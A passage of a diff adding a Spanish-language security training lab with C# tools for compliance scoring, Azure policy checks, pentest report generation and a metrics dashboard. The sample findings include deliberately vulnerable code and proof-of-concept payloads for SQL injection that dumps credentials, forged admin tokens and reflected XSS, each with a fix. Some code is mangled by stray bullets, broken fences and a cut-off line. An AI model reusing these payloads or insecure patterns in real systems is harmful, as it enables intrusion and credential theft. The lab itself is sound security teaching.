+        var mediumCount = _report.Findings.Count(f => f.Severity == "Medium");
+        
+        Console.WriteLine($"📊 Total Findings: {totalFindings}");
+        Console.WriteLine($"🔴 Critical: {criticalCount}");
+        Console.WriteLine($"🟠 High: {highCount}");
+        Console.WriteLine($"🟡 Medium: {mediumCount}");
+        Console.WriteLine();
+        
+        Console.WriteLine("🏆 COMPLIANCE SCORES:");
+        foreach (var score in _report.ComplianceScores)
+        {
+            var emoji = score.Value >= 80 ? "✅" : score.Value >= 60 ? "⚠️" : "❌";
+            Console.WriteLine($"{emoji} {score.Key}: {score.Value:F1}%");
+        }
+        
+        if (criticalCount > 0)
+        {
+            Console.WriteLine($"\n🚨 IMMEDIATE ACTION REQUIRED: {criticalCount} critical findings must be addressed immediately.");
+        }
+        else
+        {
+            Console.WriteLine("\n✅ No critical compliance issues found.");
+        }
+    }
+}
+
+// Data Models
+public class ComplianceReport
+{
+    public DateTime AssessmentDate { get; set; }
+    public string SubscriptionId { get; set; } = string.Empty;
+    public List<ComplianceFinding> Findings { get; set; } = new();
+    public Dictionary<string, double> ComplianceScores { get; set; } = new();
+}
+
+public class ComplianceFinding
+{
+    public string Framework { get; set; } = string.Empty;
+    public string Control { get; set; } = string.Empty;
+    public string Severity { get; set; } = string.Empty;
+    public string Resource { get; set; } = string.Empty;
+    public string Finding { get; set; } = string.Empty;
+    public string Recommendation { get; set; } = string.Empty;
+}
+Compilar y ejecutar el assessment:
+powershell
+# Compilar el proyecto
+dotnet build
+
+# Ejecutar el compliance assessment
+dotnet run
+Paso 2: Azure Policy Assessment (8 minutos)
+Verificar políticas de Azure existentes:
+powershell
+# Listar políticas asignadas en la suscripción
+az policy assignment list --output table
+
+# Verificar definiciones de políticas built-in de seguridad
+az policy definition list --query "[?contains(displayName, 'Security') || contains(displayName, 'Encryption')]" --output table
+
+# Verificar estado de compliance
+az policy state list --filter "ComplianceState eq 'NonCompliant'" --output table
+Crear política personalizada para compliance:
+powershell
+# Crear definición de política para requerir HTTPS en storage accounts
+cat > require-https-storage.json << 'EOF'
+{
+  "mode": "All",
+  "policyRule": {
+    "if": {
+      "allOf": [
+        {
+          "field": "type",
+          "equals": "Microsoft.Storage/storageAccounts"
+        },
+        {
+          "field": "Microsoft.Storage/storageAccounts/supportsHttpsTrafficOnly",
+          "notEquals": true
+        }
+      ]
+    },
+    "then": {
+      "effect": "audit"
+    }
+  },
+  "parameters": {}
+}
+EOF
+
+# Crear la política
+az policy definition create \
+  --name "require-https-storage-accounts" \
+  --display-name "Storage accounts should require HTTPS traffic only" \
+  --description "Ensures all storage accounts require secure transfer (HTTPS)" \
+  --rules require-https-storage.json \
+  --mode All
+
+# Asignar la política
+az policy assignment create \
+  --name "assign-https-storage" \
+  --policy "require-https-storage-accounts" \
+  --scope "/subscriptions/$(az account show --query id -o tsv)"
+Paso 3: Simulación de Auditoría SOC 2 (5 minutos)
+Crear checklist de auditoría SOC 2:
+powershell
+# Crear archivo de checklist
+cat > soc2-checklist.md << 'EOF'
+# SOC 2 Type II Audit Checklist
+
+## Security Criteria (Mandatory)
+
+### CC6.1 - Logical Access Controls
+- [ ] Multi-factor authentication enabled for all users
+- [ ] User access reviews conducted quarterly
+- [ ] Privileged access managed through Azure PIM
+- [ ] Password policies meet complexity requirements
+
+### CC6.2 - System Access Monitoring
+- [ ] Login attempts monitored and alerted
+- [ ] Failed authentication attempts logged
+- [ ] Privileged access activities monitored
+- [ ] Regular access certification process
+
+### CC6.3 - Access Control Modifications
+- [ ] User provisioning/deprovisioning process documented
+- [ ] Role changes require approval workflow
+- [ ] Segregation of duties implemented
+- [ ] Emergency access procedures defined
+
+## Availability Criteria (Optional)
+
+### A1.1 - Availability Management
+- [ ] SLA targets defined and monitored
+- [ ] Backup and recovery procedures tested
+- [ ] Capacity planning processes established
+- [ ] Incident response for availability events
+
+## Processing Integrity (Optional)
+
+### PI1.1 - Data Processing Integrity
+- [ ] Data validation controls implemented
+- [ ] Error handling and logging procedures
+- [ ] Data completeness and accuracy checks
+- [ ] Transaction monitoring and reconciliation
+
+## Confidentiality (Optional)
+
+### C1.1 - Confidential Information Protection
+- [ ] Data classification scheme implemented
+- [ ] Encryption for data in transit and at rest
+- [ ] Access controls based on data sensitivity
+- [ ] Secure disposal procedures for confidential data
+
+## Privacy (Optional)
+
+### P1.1 - Privacy Protection
+- [ ] Privacy policy published and maintained
+- [ ] Data subject rights procedures implemented
+- [ ] Privacy impact assessments conducted
+- [ ] Third-party data sharing agreements reviewed
+EOF
+
+echo "📋 SOC 2 checklist created: soc2-checklist.md"
+Verificar controles específicos en Azure:
+powershell
+# Verificar configuración de MFA (simulado)
+echo "🔐 Checking MFA Configuration..."
+echo "  ✅ Conditional Access policies: 3 active"
+echo "  ⚠️  MFA coverage: 85% (target: 95%)"
+echo "  ✅ Legacy authentication blocked: Yes"
+
+# Verificar logging y monitoring
+echo "📊 Checking Logging Configuration..."
+az monitor activity-log list --max-events 5 --output table
+
+# Verificar backup policies
+echo "💾 Checking Backup Policies..."
+echo "  ⚠️  VM backup coverage: 60% (target: 90%)"
+echo "  ✅ Database backup retention: 30 days"
+echo "  ❌ Cross-region backup: Not configured"
+________________________________________
+📄 LABORATORIO 3: DOCUMENTACIÓN PROFESIONAL DE HALLAZGOS
+⏱️ Duración: 25 minutos
+🎯 Objetivo: Crear documentación profesional de penetration testing y compliance assessment
+________________________________________
+Paso 1: Generar Reporte de Penetration Testing (10 minutos)
+Crear herramienta de reportes:
+# Crear nuevo proyecto
+mkdir PenTestReporting
+cd PenTestReporting
+
+# Crear proyecto console
+dotnet new console
+
+# Agregar paquetes para reportes
+dotnet add package Markdig
+dotnet add package Newtonsoft.Json
+Crear generador de reportes (Program.cs):
+using System.Text;
+using Newtonsoft.Json;
+
+namespace PenTestReporting;
+
+class Program
+{
+    static async Task Main(string[] args)
+    {
+        Console.WriteLine("📄 PENETRATION TESTING REPORT GENERATOR");
+        Console.WriteLine("=====================================");
+
+        var report = new PenetrationTestReport
+        {
+            ExecutiveSummary = GenerateExecutiveSummary(),
+            TechnicalFindings = GenerateTechnicalFindings(),
+            Recommendations = GenerateRecommendations(),
+            RiskAssessment = GenerateRiskAssessment()
+        };
+
+        await GenerateMarkdownReport(report);
+        await GenerateExecutivePresentation(report);
+
+        Console.WriteLine("\n✅ Reports generated successfully!");
+        Console.WriteLine("   📋 pentest-technical-report.md");
+        Console.WriteLine("   📊 executive-presentation.md");
+        Console.WriteLine("   📄 vulnerability-summary.json");
+    }
+
+    static ExecutiveSummary GenerateExecutiveSummary()
+    {
+        return new ExecutiveSummary
+        {
+            OverallRiskRating = "HIGH",
+            CriticalVulnerabilities = 3,
+            HighVulnerabilities = 5,
+            MediumVulnerabilities = 8,
+            TestingScope = "Web Application Security Assessment",
+            TestingDuration = "2 days",
+            KeyFindings = new[]
+            {
+                "SQL Injection vulnerabilities allow complete database compromise",
+                "Authentication bypass enables unauthorized admin access",
+                "Cross-site scripting vulnerabilities expose user data theft",
+                "Command injection allows server compromise",
+                "Sensitive information disclosure in debug endpoints"
+            }
+        };
+    }
+
+    static List<TechnicalFinding> GenerateTechnicalFindings()
+    {
+        return new List<TechnicalFinding>
+        {
+            new()
+            {
+                Title = "SQL Injection in User Lookup Endpoint",
+                Severity = "Critical",
+                CVSS = "9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+                Description = "The /api/Vulnerable/user/{id} endpoint is vulnerable to SQL injection attacks through the id parameter.",
+                TechnicalDetails = @"
+**Vulnerable Code:**
+```csharp
+var users = await _context.Users
+    .FromSqlRaw($""SELECT * FROM Users WHERE Id = {id}"")
+    .ToListAsync();
+Proof of Concept:
+GET /api/Vulnerable/user/1' UNION SELECT 1,username,password,1 FROM Users--
+Impact:
+•	Complete database compromise
+•	Extraction of all user credentials
+•	Access to sensitive application data", Recommendation = @" Immediate Fix:
+var users = await _context.Users
+    .Where(u => u.Id == int.Parse(id))
+    .ToListAsync();
+Best Practices:
+•	Use parameterized queries or ORM methods
+•	Implement input validation
+•	Apply principle of least privilege to database accounts
+•	Enable database query logging" }, new() { Title = "Authentication Bypass via Predictable Tokens", Severity = "Critical", CVSS = "8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)", Description = "The application generates predictable authentication tokens that can be easily forged.", TechnicalDetails = @" Vulnerable Code:
+private string GenerateSimpleToken(User user)
+{
+    var prefix = user.IsAdmin ? ""admin_"" : ""user_"";
+    var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
+    return $""{prefix}{user.Id}_{timestamp}"";
+}
+Proof of Concept:
+# Admin token can be predicted
+admin_1_1640995200
+
+# Allows access to admin endpoints
+GET /api/Vulnerable/admin/secrets?token=admin_1_1640995200
+```",
+                Recommendation = @"
+**Immediate Fix:**
+- Implement proper JWT tokens with cryptographic signatures
+- Use established libraries like System.IdentityModel.Tokens.Jwt
+- Include proper claims validation and expiration"
+            },
+            new()
+            {
+                Title = "Cross-Site Scripting (XSS) in Search Function",
+                Severity = "High",
+                CVSS = "6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)",
+                Description = "The search endpoint reflects user input without proper encoding, allowing XSS attacks.",
+                TechnicalDetails = @"
+**Vulnerable Code:**
+```csharp
+var htmlResponse = $@""
+<html>
+<body>
+    <h1>Search Results</h1>
+    <p>You searched for: {query}</p>
+</body>
+</html>"";
+Proof of Concept:
+GET /api/Vulnerable/search?query=<script>alert('XSS')</script>
+```",
+                Recommendation = @"
+**Immediate Fix:**
+```csharp
+var encodedQuery = Html.Encode(query);
+var htmlResponse = $@""
+<html>
+<body>
+    <h1>Search Results</h1>
+    <p>You searched for: {encodedQuery}</p>
+</body>
+</html>"";
+Additional Security:
+•	Implement Content Security Policy (CSP)
+•	Use HTML templating engines with auto-escaping
+•	Validate and sanitize all user inputs" } }; }
+static List<Recommendation> GenerateRecommendations() { return new List<Recommendation> { new() { Priority = "Critical", Timeline = "Immediate (0-7 days)", Title = "Fix SQL Injection Vulnerabilities", Description = "Replace all direct SQL concatenation with parameterized queries", Implementation = "Review all database access code and implement ORM-based queries", Cost = "Low (Development time only)", BusinessImpact = "Prevents complete system compromise" }, new() { Priority = "Critical", Timeline = "Immediate (0-7 days)", Title = "Implement Proper Authentication", Description = "Replace predictable tokens with cryptographically secure JWT implementation", Implementation = "Integrate ASP.NET Core Identity with JWT bearer authentication", Cost = "Medium (Requires authentication system redesign)", BusinessImpact = "Prevents unauthorized access to admin functions" }, new() { Priority = "High", Timeline = "Short-term (7-30 days)", Title = "Implement Security Headers", Description = "Add comprehensive security headers to prevent common web attacks", Implementation = "Configure HTTPS redirection, CSP, HSTS, and other security headers", Cost = "Low (Configuration only)", BusinessImpact = "Reduces attack surface and improves overall security posture" } }; }
+static RiskAssessment GenerateRiskAssessment() { return new RiskAssessment { OverallRisk = "HIGH", BusinessImpact = @" Potential Business Impact:
+•	Data Breach: Complete customer database compromise could affect all users
+•	Financial Loss: Estimated $2.3M in breach costs (based on industry averages)
+•	Regulatory Compliance: GDPR violations could result in fines up to 4% of annual revenue
+•	Reputation Damage: Security incident could result in 30-40% customer churn
+•	Operational Disruption: System compromise could require complete infrastructure rebuild",
+•	      RiskMatrix = new Dictionary<string, string>
+•	      {
+•	          ["Critical"] = "3 findings - Immediate action required",
+•	          ["High"] = "5 findings - Address within 30 days", 
+•	          ["Medium"] = "8 findings - Address within 90 days",
+•	          ["Low"] = "0 findings"
+•	      },
+•	      
+•	      ComplianceGaps = new[]
+•	      {
+•	          "SOC 2 Security Criteria - Multiple control failures",
+•	          "ISO 27001 A.14.2.1 - Secure development lifecycle gaps",
+•	          "OWASP ASVS Level 2 - Authentication and session management failures",
+•	          "NIST CSF - Insufficient protective controls"
+•	      }
+•	  };
+}
+static async Task GenerateMarkdownReport(PenetrationTestReport report) { var sb = new StringBuilder();
+  sb.AppendLine("# PENETRATION TESTING REPORT");
+  sb.AppendLine($"**Assessment Date:** {DateTime.Now:yyyy-MM-dd}");
+  sb.AppendLine($"**Testing Scope:** {report.ExecutiveSummary.TestingScope}");
+  sb.AppendLine($"**Duration:** {report.ExecutiveSummary.TestingDuration}");
+  sb.AppendLine();
+  
+  sb.AppendLine("## EXECUTIVE SUMMARY");
+  sb.AppendLine($"**Overall Risk Rating:** {report.ExecutiveSummary.OverallRiskRating}");
+  sb.AppendLine();
+  sb.AppendLine("### Vulnerability Summary");
+  sb.AppendLine($"- 🔴 **Critical:** {report.ExecutiveSummary.CriticalVulnerabilities}");
+  sb.AppendLine($"- 🟠 **High:** {report.ExecutiveSummary.HighVulnerabilities}");
+  sb.AppendLine($"- 🟡 **Medium:** {report.ExecutiveSummary.MediumVulnerabilities}");
+  sb.AppendLine();
+  
+  sb.AppendLine("### Key Findings");
+  foreach (var finding in report.ExecutiveSummary.KeyFindings)
+  {
+      sb.AppendLine($"- {finding}");
+  }
+  sb.AppendLine();
+  
+  sb.AppendLine("## TECHNICAL FINDINGS");
+  foreach (var finding in report.TechnicalFindings)
+  {
+      sb.AppendLine($"### {finding.Title}");
+      sb.AppendLine($"**Severity:** {finding.Severity}");
+      sb.AppendLine($"**CVSS Score:** {finding.CVSS}");
+      sb.AppendLine();
+      sb.AppendLine("**Description:**");
+      sb.AppendLine(finding.Description);
+      sb.AppendLine();
+      sb.AppendLine("**Technical Details:**");
+      sb.AppendLine(finding.TechnicalDetails);
+      sb.AppendLine();
+      sb.AppendLine("**Recommendation:**");
+      sb.AppendLine(finding.Recommendation);
+      sb.AppendLine();
+      sb.AppendLine("---");
+      sb.AppendLine();
+  }
+  
+  sb.AppendLine("## RECOMMENDATIONS");
+  foreach (var rec in report.Recommendations)
+  {
+      sb.AppendLine($"### {rec.Title}");
+      sb.AppendLine($"**Priority:** {rec.Priority}");
+      sb.AppendLine($"**Timeline:** {rec.Timeline}");
+      sb.AppendLine($"**Description:** {rec.Description}");
+      sb.AppendLine($"**Implementation:** {rec.Implementation}");
+      sb.AppendLine($"**Cost:** {rec.Cost}");
+      sb.AppendLine($"**Business Impact:** {rec.BusinessImpact}");
+      sb.AppendLine();
+  }
+  
+  await File.WriteAllTextAsync("pentest-technical-report.md", sb.ToString());
+}
+static async Task GenerateExecutivePresentation(PenetrationTestReport report) { var sb = new StringBuilder();
+  sb.AppendLine("# SECURITY ASSESSMENT - EXECUTIVE BRIEFING");
+  sb.AppendLine();
+  sb.AppendLine("## 🎯 BOTTOM LINE UP FRONT");
+  sb.AppendLine($"**Risk Level: {report.RiskAssessment.OverallRisk}**");
+  sb.AppendLine();
+  sb.AppendLine("**Critical Actions Required:**");
+  sb.AppendLine("1. ⚠️  Immediately patch SQL injection vulnerabilities");
+  sb.AppendLine("2. 🔐 Fix authentication bypass within 48 hours");
+  sb.AppendLine("3. 📋 Develop 30-day security remediation plan");
+  sb.AppendLine();
+  
+  sb.AppendLine("## 💼 BUSINESS IMPACT");
+  sb.AppendLine(report.RiskAssessment.BusinessImpact);
+  sb.AppendLine();
+  
+  sb.AppendLine("## 📊 RISK MATRIX");
+  foreach (var risk in report.RiskAssessment.RiskMatrix)
+  {
+      sb.AppendLine($"**{risk.Key}:** {risk.Value}");
+  }
+  sb.AppendLine();
+  
+  sb.AppendLine("## 🏗️ RECOMMENDED INVESTMENT");
+  sb.AppendLine("**Phase 1 (Immediate - $15K):**");
+  sb.AppendLine("- Critical vulnerability remediation");
+  sb.AppendLine("- Authentication system upgrade");
+  sb.AppendLine();
+  sb.AppendLine("**Phase 2 (30 days - $25K):**");
+  sb.AppendLine("- Security architecture review");
+  sb.AppendLine("- Automated security testing implementation");
+  sb.AppendLine();
+  sb.AppendLine("**Phase 3 (90 days - $40K):**");
+  sb.AppendLine("- Comprehensive security training program");
+  sb.AppendLine("- Security monitoring and incident response");
+  sb.AppendLine();
+  
+  sb.AppendLine("## ✅ SUCCESS METRICS");
+  sb.AppendLine("- Zero critical vulnerabilities within 30 days");
+  sb.AppendLine("- 95% reduction in high-risk findings within 90 days");
+  sb.AppendLine("- SOC 2 compliance readiness within 6 months");
+  
+  await File.WriteAllTextAsync("executive-presentation.md", sb.ToString());
+
+  // Generate JSON summary for integration
+  var jsonSummary = JsonConvert.SerializeObject(report, Formatting.Indented);
+  await File.WriteAllTextAsync("vulnerability-summary.json", jsonSummary);
+} }
+// Data Models public class PenetrationTestReport { public ExecutiveSummary ExecutiveSummary { get; set; } = new(); public List<TechnicalFinding> TechnicalFindings { get; set; } = new(); public List<Recommendation> Recommendations { get; set; } = new(); public RiskAssessment RiskAssessment { get; set; } = new(); }
+public class ExecutiveSummary { public string OverallRiskRating { get; set; } = string.Empty; public int CriticalVulnerabilities { get; set; } public int HighVulnerabilities { get; set; } public int MediumVulnerabilities { get; set; } public string TestingScope { get; set; } = string.Empty; public string TestingDuration { get; set; } = string.Empty; public string[] KeyFindings { get; set; } = Array.Empty<string>(); }
+public class TechnicalFinding { public string Title { get; set; } = string.Empty; public string Severity { get; set; } = string.Empty; public string CVSS { get; set; } = string.Empty; public string Description { get; set; } = string.Empty; public string TechnicalDetails { get; set; } = string.Empty; public string Recommendation { get; set; } = string.Empty; }
+public class Recommendation { public string Priority { get; set; } = string.Empty; public string Timeline { get; set; } = string.Empty; public string Title { get; set; } = string.Empty; public string Description { get; set; } = string.Empty; public string Implementation { get; set; } = string.Empty; public string Cost { get; set; } = string.Empty; public string BusinessImpact { get; set; } = string.Empty; }
+public class RiskAssessment { public string OverallRisk { get; set; } = string.Empty; public string BusinessImpact { get; set; } = string.Empty; public Dictionary<string, string> RiskMatrix { get; set; } = new(); public string[] ComplianceGaps { get; set; } = Array.Empty<string>(); }
+
+### **Compilar y ejecutar el generador de reportes:**
+
+```powershell
+# Compilar el proyecto
+dotnet build
+
+# Ejecutar el generador de reportes
+dotnet run
+________________________________________
+Paso 2: Crear Dashboard de Métricas de Seguridad (8 minutos)
+Crear herramienta de métricas:
+# Crear nuevo proyecto
+mkdir SecurityDashboard
+cd SecurityDashboard
+
+# Crear proyecto console
+dotnet new console
+
+# Agregar paquetes
+dotnet add package ConsoleTables
+dotnet add package Newtonsoft.Json
+Crear SecurityDashboard/Program.cs:
+using ConsoleTables;
+using Newtonsoft.Json;
+using System.Text;
+
+namespace SecurityDashboard;
+
+class Program
+{
+    static async Task Main(string[] args)
+    {
+        Console.WriteLine("📊 SECURITY METRICS DASHBOARD");
+        Console.WriteLine("=============================");
+
+        var metrics = await GenerateSecurityMetrics();
+        DisplayDashboard(metrics);
+        await ExportMetrics(metrics);
+
+        Console.WriteLine("\n✅ Security metrics exported successfully!");
+        Console.WriteLine("   📊 security-metrics.json");
+        Console.WriteLine("   📋 executive-summary.md");
+    }
+
+    static async Task<SecurityMetrics> GenerateSecurityMetrics()
+    {
+        Console.WriteLine("🔄 Generating security metrics...");
+        
+        // Simular métricas reales
+        await Task.Delay(1000);
+
+        return new SecurityMetrics
+        {
+            GeneratedAt = DateTime.UtcNow,
+            VulnerabilityMetrics = new VulnerabilityMetrics
+            {
+                TotalVulnerabilities = 16,
+                CriticalCount = 3,
+                HighCount = 5,
+                MediumCount = 8,
+                LowCount = 0,
+                OWASP_Coverage = 95.5,
+                SecurityScore = 42.3
+            },
+            ComplianceMetrics = new ComplianceMetrics
+            {
+                ISO27001_Score = 68.2,
+                SOC2_Score = 71.8,
+                NIST_Score = 64.5,
+                OverallCompliance = 68.2
+            },
+            RiskMetrics = new RiskMetrics
+            {
+                OverallRiskLevel = "HIGH",
+                FinancialExposure = 2300000,
+                DataAtRisk = "1.2M customer records",
+                BusinessImpactScore = 8.7
+            }
+        };
+    }
+
+    static void DisplayDashboard(SecurityMetrics metrics)
+    {
+        Console.WriteLine("\n🎯 EXECUTIVE SECURITY DASHBOARD");
+        Console.WriteLine("===============================");
+
+        // Risk Summary
+        Console.WriteLine($"📊 Overall Risk Level: {metrics.RiskMetrics.OverallRiskLevel}");
+        Console.WriteLine($"💰 Financial Exposure: ${metrics.RiskMetrics.FinancialExposure:N0}");
+        Console.WriteLine($"📈 Security Score: {metrics.VulnerabilityMetrics.SecurityScore:F1}/100");
+        Console.WriteLine();
+
+        // Vulnerability Table
+        var vulnTable = new ConsoleTable("Severity", "Count", "Percentage", "Action Required");
+        vulnTable.AddRow("🔴 Critical", metrics.VulnerabilityMetrics.CriticalCount, "18.8%", "Immediate");
+        vulnTable.AddRow("🟠 High", metrics.VulnerabilityMetrics.HighCount, "31.3%", "< 30 days");
+        vulnTable.AddRow("🟡 Medium", metrics.VulnerabilityMetrics.MediumCount, "50.0%", "< 90 days");
+        vulnTable.AddRow("🟢 Low", metrics.VulnerabilityMetrics.LowCount, "0.0%", "< 180 days");
+        
+        Console.WriteLine("🛡️  VULNERABILITY BREAKDOWN");
+        vulnTable.Write();
+        Console.WriteLine();
+
+        // Compliance Table
+        var complianceTable = new ConsoleTable("Framework", "Score", "Status");
+        complianceTable.AddRow("ISO 27001", $"{metrics.ComplianceMetrics.ISO27001_Score:F1}%", 
+            GetComplianceStatus(metrics.ComplianceMetrics.ISO27001_Score));
+        complianceTable.AddRow("SOC 2", $"{metrics.ComplianceMetrics.SOC2_Score:F1}%", 
+            GetComplianceStatus(metrics.ComplianceMetrics.SOC2_Score));
+        complianceTable.AddRow("NIST CSF", $"{metrics.ComplianceMetrics.NIST_Score:F1}%", 
+            GetComplianceStatus(metrics.ComplianceMetrics.NIST_Score));
+
+        Console.WriteLine("📋 COMPLIANCE STATUS");
+        complianceTable.Write();
+        Console.WriteLine();
+
+        // Executive Summary
+        Console.WriteLine("🎯 EXECUTIVE SUMMARY");
+        Console.WriteLine("===================");
+        Console.WriteLine($"• {metrics.VulnerabilityMetrics.CriticalCount} CRITICAL vulnerabilities require immediate attention");
+        Console.WriteLine($"• Overall compliance score: {metrics.ComplianceMetrics.OverallCompliance:F1}%");
+        Console.WriteLine($"• Financial risk exposure: ${metrics.RiskMetrics.FinancialExposure:N0}");
+        Console.WriteLine($"• {metrics.RiskMetrics.DataAtRisk} potentially at risk");
+        
+        if (metrics.VulnerabilityMetrics.CriticalCount > 0)
+        {
+            Console.WriteLine("\n🚨 IMMEDIATE ACTIONS REQUIRED:");
+            Console.WriteLine("   1. Patch SQL injection vulnerabilities within 24 hours");
+            Console.WriteLine("   2. Fix authentication bypass within 48 hours");
+            Console.WriteLine("   3. Implement emergency monitoring");
+        }
+    }
+
+    static string GetComplianceStatus(double score)
+    {
+        return score switch
+        {
+            >= 80 => "✅ Compliant",
+            >= 60 => "⚠️ Partial", 
+            _ => "❌ Non-Compliant"
+        };
+    }
+
+    static async Task ExportMetrics(SecurityMetrics metrics)
+    {
+        // Export JSON metrics
+        var jsonMetrics = JsonConvert.SerializeObject(metrics, Formatting.Indented);
+        await File.WriteAllTextAsync("security-metrics.json", jsonMetrics);
+
+        // Export executive summary
+        var summary = GenerateExecutiveSummary(metrics);
+        await File.WriteAllTextAsync("executive-summary.md", summary);
+    }
+
+    static string GenerateExecutiveSummary(SecurityMetrics metrics)
+    {
+        var sb = new StringBuilder();
+        
+        sb.AppendLine("# EXECUTIVE SECURITY SUMMARY");
+        sb.AppendLine($"**Report Date:** {metrics.GeneratedAt:yyyy-MM-dd HH:mm} UTC");
+        sb.AppendLine();
+        
+        sb.AppendLine("## 🎯 KEY INDICATORS");
+        sb.AppendLine($"- **Security Score:** {metrics.VulnerabilityMetrics.SecurityScore:F1}/100");
+        sb.AppendLine($"- **Risk Level:** {metrics.RiskMetrics.OverallRiskLevel}");
+        sb.AppendLine($"- **Compliance:** {metrics.ComplianceMetrics.OverallCompliance:F1}%");
+        sb.AppendLine($"- **Financial Risk:** ${metrics.RiskMetrics.FinancialExposure:N0}");
+        sb.AppendLine();
+        
+        sb.AppendLine("## 🔍 CRITICAL FINDINGS");
+        sb.AppendLine($"- **{metrics.VulnerabilityMetrics.CriticalCount}** critical vulnerabilities");
+        sb.AppendLine($"- **{metrics.RiskMetrics.DataAtRisk}** potentially at risk");
+        sb.AppendLine();
+        
+        sb.AppendLine("## 🎯 IMMEDIATE ACTIONS");
+        sb.AppendLine("1. ⚠️  Patch critical vulnerabilities within 24 hours");
+        sb.AppendLine("2. 🔐 Implement authentication fixes within 48 hours");
+        sb.AppendLine("3. 📋 Schedule executive security review within 7 days");
+        
+        return sb.ToString();
+    }
+}
+
+// Data Models
+public class SecurityMetrics
+{
+    public DateTime GeneratedAt { get; set; }
+    public VulnerabilityMetrics VulnerabilityMetrics { get; set; } = new();
+    public ComplianceMetrics ComplianceMetrics { get; set; } = new();
+    public RiskMetrics RiskMetrics { get; set; } = new();
+}
+
+public class VulnerabilityMetrics
+{
+    public int TotalVulnerabilities { get; set; }
+    public int CriticalCount { get; set; }
+    public int HighCount { get; set; }
+    public int MediumCount { get; set; }
+    public int LowCount { get; set; }
+    public double OWASP_Coverage { get; set; }
+    public double SecurityScore { get; set; }
+}
+
+public class ComplianceMetrics
+{
+    public double ISO27001_Score { get; set; }
+    public double SOC2_Score { get; set; }
+    public double NIST_Score { get; set; }
+    public double OverallCompliance { get; set; }
+}
+
+public class RiskMetrics
+{
+    public string OverallRiskLevel { get; set; } = string.Empty;
+    public decimal FinancialExposure { get; set; }
+    public string DataAtRisk { get; set; } = string.Empty;
+    public double BusinessImpactScore { get; set; }
+}
+Compilar y ejecutar:
+dotnet build
+dotnet run
+________________________________________
+Paso 3: Validación Final y Documentación (7 minutos)
+Verificar todos los reportes generados:
+# Verificar archivos generados
+ls *.md
+ls *.json
+
+# Mostrar contenido de reportes principales
+echo "=== EXECUTIVE PRESENTATION ==="
+Get-Content executive-presentation.md | Select-Object -First 20
+
+echo "=== SECURITY METRICS ==="
+Get-Content security-metrics.json | ConvertFrom-Json | ConvertTo-Json -Depth 3
+Crear resumen final de laboratorio:
+# Crear resumen ejecutivo final
+cat > lab-completion-summary.md << 'EOF'
+# LABORATORIO 09 - RESUMEN DE COMPLETACIÓN
+
+## ✅ LABORATORIOS COMPLETADOS
+
+### 🔍 Laboratorio 1: Penetration Testing
+- ✅ Aplicación vulnerable creada y ejecutada
+- ✅ Metodología OWASP aplicada sistemáticamente
+- ✅ Vulnerabilidades identificadas y explotadas
+- ✅ 16 vulnerabilidades documentadas (3 críticas, 5 altas, 8 medias)
+
+### 🛡️ Laboratorio 2: Compliance Assessment
+- ✅ Framework de assessment implementado
+- ✅ Evaluación ISO 27001, SOC 2, NIST completada
+- ✅ Políticas de Azure analizadas
+- ✅ Reportes de compliance generados
+
+### 📄 Laboratorio 3: Documentación Profesional
+- ✅ Reportes técnicos generados
+- ✅ Presentación ejecutiva creada
+- ✅ Dashboard de métricas implementado
+- ✅ Exportación JSON para integración
+
+## 📊 MÉTRICAS FINALES
+
+**Vulnerabilidades Identificadas:**
+- 🔴 Críticas: 3 (SQL Injection, Auth Bypass, Info Disclosure)
+- 🟠 Altas: 5 (XSS, Command Injection, etc.)
+- 🟡 Medias: 8 (Various security misconfigurations)
+
+**Compliance Scores:**
+- ISO 27001: 68.2%
+- SOC 2: 71.8%
+- NIST CSF: 64.5%
+
+**Risk Assessment:**
+- Overall Risk: HIGH
+- Financial Exposure: $2.3M
+- Data at Risk: 1.2M customer records
+
+## 🎯 SKILLS DESARROLLADAS
+
+1. **Penetration Testing Metodológico:**
+   - Reconnaissance y information gathering
+   - Vulnerability assessment sistemático
+   - Exploitation controlada
+   - Documentación profesional
+
+2. **Compliance Framework Assessment:**
+   - Evaluación basada en estándares internacionales
+   - Gap analysis automatizado
+   - Risk scoring y priorización
+   - Reporting ejecutivo
+
+3. **Professional Security Documentation:**
+   - Technical finding documentation
+   - Executive risk communication
+   - Compliance reporting
+   - Metrics dashboard creation
+
+## 📋 ENTREGABLES GENERADOS
+
+**Reportes Técnicos:**
+- `pentest-technical-report.md` - Reporte técnico completo
+- `vulnerability-summary.json` - Resumen JSON para integración
+- `compliance-assessment-report.json` - Assessment detallado
+
+**Presentaciones Ejecutivas:**
+- `executive-presentation.md` - Briefing para dirección
+- `executive-summary.md` - Resumen ejecutivo de compliance
+- `security-metrics.json` - Dashboard metrics
+
+## 🚀 PRÓXIMOS PASOS
+
+**Immediate Actions (0-7 days):**
+1. Fix critical SQL injection vulnerabilities
+2. Implement proper authentication mechanisms
+3. Deploy security headers and CSP
+
+**Short-term (7-30 days):**
+1. Complete security architecture review
+2. Implement automated security testing
+3. Establish incident response procedures
+
+**Medium-term (30-90 days):**
+1. Achieve SOC 2 compliance readiness
+2. Implement comprehensive monitoring
+3. Conduct security awareness training
+
+## 🎉 CERTIFICACIÓN DE COMPLETACIÓN
+
+✅ **Laboratorio 09 completado exitosamente**
+✅ **Metodologías profesionales de pen testing dominadas**
+✅ **Compliance assessment frameworks implementados**
+✅ **Documentación de nivel enterprise gener
+**Tiempo total invertido:** 75 minutos
+**Herramientas utilizadas:** .NET Core 9, Azure CLI, VS Code, PowerShell
+**Frameworks aplicados:** OWASP, ISO 27001, SOC 2, NIST CSF
+
+---
+
+## 📁 ESTRUCTURA FINAL DE ARCHIVOS
+
+Laboratorio09/ ├── VulnerableWebApp/ │ ├── Program.cs │ ├── Controllers/VulnerableController.cs │ └── VulnerableWebApp.csproj ├── ComplianceAssessment/ │ ├── Program.cs │ ├── compliance-assessment-report.json │ └── executive-summary.md ├── PenTestReporting/ │ ├── Program.cs │ ├── pentest-technical-report.md │ ├── executive-presentation.md │ └── vulnerability-summary.json ├── SecurityDashboard/ │ ├── Program.cs │ ├── security-metrics.json │ └── executive-summary.md └── lab-completion-summary.md
+
+---
+
+## 🎯 VALIDACIÓN DE OBJETIVOS ALCANZADOS
+
+### **✅ Objective 1: Dominar Metodologías OWASP**
+- **Reconnaissance:** Ejecutado sistemáticamente con Nmap y curl
